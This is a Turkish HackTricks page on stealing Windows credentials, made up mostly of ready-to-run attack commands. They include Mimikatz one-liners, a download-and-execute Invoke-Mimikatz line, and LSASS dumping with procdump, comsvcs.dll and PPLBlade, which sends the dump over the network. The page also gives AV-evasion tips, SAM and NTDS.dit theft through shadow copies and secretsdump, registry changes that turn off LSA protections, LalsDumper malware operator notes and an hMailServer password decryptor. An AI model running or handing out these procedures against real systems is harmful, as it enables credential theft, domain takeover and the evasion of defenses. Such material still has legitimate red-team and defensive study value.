# Windows Kimlik Bilgilerini Çalma

{{#include ../../banners/hacktricks-training.md}}

## Kimlik Bilgileri Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabilecekleri hakkında daha fazla bilgi için** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Burada bazı olası credentials protections hakkında bilgi edinin.**](credentials-protections.md) **Bu korumalar Mimikatz'in bazı credentials'ları çıkarmasını engelleyebilir.**

## Credentials with Meterpreter

Hedef içinde **search for passwords and hashes** aramak için benim oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV'yi Atlatma

### Procdump + Mimikatz

Çünkü [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) kaynaklı **Procdump**, meşru bir Microsoft aracı olduğundan Defender tarafından tespit edilmez.\
Bu aracı kullanarak **lsass** sürecini dumplayabilir, dump'ı indirip dump'tan **credentials**'ı yerel olarak çıkarabilirsiniz.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) da kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu süreç [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV**'ler **procdump.exe to dump lsass.exe** kullanımını **zararlı** olarak **tespit** edebilir; bunun nedeni **"procdump.exe" and "lsass.exe"** stringlerini **tespit** ediyor olmalarıdır. Bu yüzden **lsass.exe** adını vermek **yerine**, procdump'a **lsass.exe**'nin **PID**'sini **argüman** olarak **göndermek** **daha gizlidir**.

### lsass'in **comsvcs.dll** ile dumplanması

C:\Windows\System32 içinde bulunan **comsvcs.dll** adlı bir DLL, çökme durumunda **işlem belleğinin dökümünü alma** işinden sorumludur. Bu DLL, `MiniDumpW` adlı bir **fonksiyon** içerir ve `rundll32.exe` kullanılarak çağrılacak şekilde tasarlanmıştır.\
İlk iki argümanı kullanmak önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dumplanacak işlem ID'si birinci bileşeni oluşturur, dump dosyasının konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Başka seçenek yoktur.\
Bu üç bileşen ayrıştırıldıktan sonra, DLL dump dosyasını oluşturur ve belirtilen işlemin belleğini bu dosyaya aktarır.\
**comsvcs.dll**'in kullanılması lsass işlemini dumplamak için mümkündür; böylece procdump yüklemeye ve çalıştırmaya gerek kalmaz. Bu yöntem ayrıntılı olarak şu adreste açıklanmıştır: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/).

Aşağıdaki komut yürütme için kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi otomatikleştirebilirsiniz** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Task Manager ile lsass'i dökme**

1. Görev Çubuğuna sağ tıklayın ve Task Manager'a tıklayın
2. More details'e tıklayın
3. Processes sekmesinde "Local Security Authority Process" process'ini arayın
4. "Local Security Authority Process" process'ine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.

### procdump ile lsass'i dökme

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft tarafından imzalanmış bir binary'dir ve [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçasıdır.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass ile PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) diske yazmadan memory dump'ını obfuscating yapıp uzak iş istasyonlarına aktarmayı destekleyen bir Protected Process Dumper Tool'udur.

**Temel işlevler**:

1. Bypassing PPL protection
2. Obfuscating memory dump dosyalarını kullanarak Defender'ın imza tabanlı tespit mekanizmalarından kaçınma
3. Memory dump'ı RAW ve SMB upload yöntemleriyle diske yazmadan yükleme (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP tabanlı LSASS dökümü MiniDumpWriteDump olmadan

Ink Dragon, `MiniDumpWriteDump`'u asla çağırmayan ve **LalsDumper** adını taşıyan üç aşamalı bir dumper içerir; bu yüzden o API üzerindeki EDR hook'ları hiç tetiklenmez:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir yer tutucu arar, bunu `rtu.txt`'nin mutlak yolu ile değiştirir, yamalanmış DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağırır. Bu, **LSASS**'ın kötü amaçlı DLL'i yeni bir Security Support Provider (SSP) olarak yüklemesini zorlar.
2. **Stage 2 inside LSASS** – **LSASS** `nfdp.dll`'yi yüklediğinde, DLL `rtu.txt`'yi okur, her byte'ı `0x20` ile XOR'lar ve yürütmeyi aktarmadan önce çözülen blob'u belleğe mapler.
3. **Stage 3 dumper** – haritalanmış payload, karmalanmış API isimlerinden çözülen (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`) **direct syscalls** kullanarak MiniDump mantığını yeniden uygular. `Tom` adlı özel bir export `%TEMP%\<pid>.ddt`'yi açar, sıkıştırılmış bir LSASS dökümünü dosyaya akıtır ve daha sonra exfiltration yapılabilmesi için handle'ı kapatır.

Operator notes:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt`'yi aynı dizinde tutun. Stage 1 sabit kodlanmış yer tutucuyu `rtu.txt`'nin mutlak yolu ile yeniden yazar; bunları ayırmak zinciri bozar.
* Kayıt, `nfdp`'yi `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`'e ekleyerek yapılır. Bu değeri kendiniz ayarlayarak LSASS'ın her açılışta SSP'yi yeniden yüklemesini sağlayabilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dökümlerdir. Yerelde açın (decompress), sonra credential extraction için Mimikatz/Volatility'e verin.
* `lals.exe`'yi çalıştırmak admin/SeTcb hakları gerektirir ki `AddSecurityPackageA` başarılı olsun; çağrı döndüğünde LSASS şeffaf şekilde rogue SSP'yi yükler ve Stage 2'yi çalıştırır.
* DLL'i diskten silmek onu LSASS'tan çıkarmaz. Ya registry girdisini silip LSASS'ı yeniden başlatın (reboot) ya da uzun süreli persistence için bırakın.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### NTDS.dit'i hedef DC'den dök
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit parola geçmişini dök
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Bu dosyalar _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ konumunda olmalıdır. Ancak **bunları normal bir şekilde kopyalayamazsınız** çünkü korunuyorlar.

### Kayıt Defterinden

Bu dosyaları çalmanın en kolay yolu bunların bir kopyasını kayıt defterinden almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
Bu dosyaları Kali makinenize **Download** edin ve **extract the hashes** yapmak için şu komutu kullanın:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu hizmeti kullanarak korumalı dosyaların kopyasını alabilirsiniz. Yönetici (Administrator) olmanız gerekir.

#### vssadmin kullanımı

vssadmin ikili dosyası yalnızca Windows Server sürümlerinde mevcuttur
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ama aynı şeyi **Powershell** ile de yapabilirsiniz. Bu, **SAM file'ını nasıl kopyalayacağınız** konusunda bir örnektir (kullanılan sabit disk "C:" ve kaydedildiği yer C:\users\Public) ancak bunu herhangi bir korumalı dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını almak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Kimlik Bilgileri - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: Bu tablo kullanıcılar ve gruplar gibi nesnelerle ilgili ayrıntıları saklamaktan sorumludur.
- **Link Table**: Grup üyelikleri gibi ilişkileri takip eder.
- **SD Table**: Her nesne için güvenlik tanımlayıcılarını tutar; bu, depolanan nesneler için güvenlik ve erişim kontrolünü sağlar.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### NTDS.dit içindeki hashlerin şifre çözülmesi

Hash 3 kez şifrelenmiştir:

1. Password Encryption Key (**PEK**) **BOOTKEY** ve **RC4** kullanılarak deşifre edilir.
2. Hash **PEK** ve **RC4** kullanılarak deşifre edilir.
3. Hash **DES** kullanılarak deşifre edilir.

**PEK**, her domain controller'da aynı değere sahiptir; ancak NTDS.dit dosyası içinde domain controller'ın **SYSTEM** dosyasının **BOOTKEY**'i kullanılarak şifrelenmiştir (domain controller'lar arasında farklıdır). Bu yüzden NTDS.dit dosyasından kimlik bilgilerini almak için **NTDS.dit** ve **SYSTEM** dosyalarına ihtiyaç vardır (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil kullanarak NTDS.dit'i kopyalama

Windows Server 2008'den beri kullanılabilir.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ayrıca [**volume shadow copy**](#stealing-sam-and-system) hilesini kullanarak **ntds.dit** dosyasını kopyalayabilirsiniz. Ayrıca bir **SYSTEM file** kopyasına da ihtiyacınız olacağını unutmayın (yeniden, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) hilesini kullanın).

### **NTDS.dit'ten hashes çıkarmak**

**NTDS.dit** ve **SYSTEM** dosyalarını **elde ettiğinizde**, _secretsdump.py_ gibi araçlarla **hashes'i çıkarmak** için kullanabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli bir domain admin kullanıcısı kullanarak onları **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Büyük **NTDS.dit dosyaları** için [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılarak çıkarılması önerilir.

Son olarak, ayrıca **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanabilirsiniz.

### **NTDS.dit içindeki domain nesnelerinin bir SQLite veritabanına çıkarılması**

NTDS nesneleri [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Sadece gizli veriler değil; ham NTDS.dit dosyası elde edildikten sonra daha fazla bilgi çıkarmak için tüm nesneler ve bunların öznitelikleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive isteğe bağlıdır ancak sırların deşifre edilmesine olanak tanır (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Diğer bilgilerle birlikte aşağıdaki veriler çıkarılır: user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...

## Lazagne

Binary'yi [here](https://github.com/AlessandroZ/LaZagne/releases) adresinden indirin. Bu binary'yi çeşitli yazılımlardan credentials çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'ten kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç bellekten kimlik bilgilerini çıkarmak için kullanılabilir. İndirmek için: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkar
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**; parolalar çıkarılacaktır.

## Boşta kalan RDP oturumlarını keşfetme ve güvenlik kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT’ı, herhangi bir red-teamer için kullanışlı olan `DumpRDPHistory` adlı bir tasker içerir:

### DumpRDPHistory tarzı telemetri toplama

* **Giden RDP hedefleri** – her kullanıcı hive'ini `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` konumunda ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint`'i ve son yazma zaman damgasını saklar. FinalDraft’in mantığını PowerShell ile şu şekilde çoğaltabilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Gelen RDP kanıtı** – kimlerin makineyi yönettiğini haritalamak için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlükünü Event ID'leri **21** (başarılı oturum açma) ve **25** (bağlantı kesme) için sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin’in düzenli bağlandığını öğrendikten sonra, onların **bağlantısı kesilmiş** oturumu hâlâ dururken LSASS’i (LalsDumper/Mimikatz ile) dökün. CredSSP + NTLM fallback, doğrulayıcılarını ve token’larını LSASS içinde bırakır; bunlar daha sonra SMB/WinRM üzerinden replay edilerek `NTDS.dit` elde etmek veya domain controller’larda kalıcılık sağlamak için kullanılabilir.

### FinalDraft tarafından hedeflenen Kayıt Defteri düşürmeleri
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` ayarı, RDP sırasında credential/ticket'ların tam yeniden kullanımını zorlar ve pass-the-hash tarzı pivotlara olanak tanır.
* `LocalAccountTokenFilterPolicy=1` UAC token filtering'i devre dışı bırakır; böylece local admins ağ üzerinden kısıtlamasız token'lar alır.
* `DSRMAdminLogonBehavior=2` DSRM yöneticisinin DC çevrimiçi iken oturum açmasına izin verir; bu, saldırganlara yerleşik başka bir yüksek ayrıcalıklı hesap sağlar.
* `RunAsPPL=0` LSASS PPL korumalarını kaldırır; bu, LalsDumper gibi dumpers için belleğe erişimi kolaylaştırır.

## hMailServer veritabanı kimlik bilgileri (ele geçirilme sonrası)

hMailServer DB şifresini `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` dosyasında `[Database] Password=` altında saklar. Değer, Blowfish ile statik anahtar `THIS_KEY_IS_NOT_SECRET` kullanılarak şifrelenmiştir ve 4 baytlık word endianness değiş tokuşları uygulanmıştır. INI'den alınan hex string'i şu Python snippet'i ile kullanın:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Clear-text parolayı kullanarak, dosya kilitlerinden kaçınmak için SQL CE veritabanını kopyalayın, 32-bit provider'ı yükleyin ve hashleri sorgulamadan önce gerekirse güncelleyin:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` sütunu hMailServer hash formatını kullanır (hashcat mode `1421`). Bu değerlerin kırılması WinRM/SSH pivots için yeniden kullanılabilir kimlik bilgileri sağlayabilir.
## Referanslar

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
